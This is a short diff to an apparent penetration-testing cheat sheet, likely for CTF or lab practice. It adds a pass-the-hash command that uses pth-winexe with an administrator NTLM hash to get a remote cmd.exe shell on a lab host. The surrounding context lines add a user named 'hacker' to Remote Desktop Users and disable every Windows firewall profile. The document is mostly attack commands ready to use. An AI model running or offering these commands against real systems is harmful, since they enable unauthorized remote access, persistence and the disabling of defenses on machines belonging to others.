@@ -17,6 +17,13 @@ net localgroup "Remote Desktop Users" hacker /ADD
 NetSh Advfirewall set allprofiles state off
 ````
 
+#### Pass the hash
+````
+pth-winexe -U JEEVES/administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cb
+e81fe00 //10.129.26.210 cmd.exe
+
+````
+
 
 #### Ping test blind rce
 ```sh
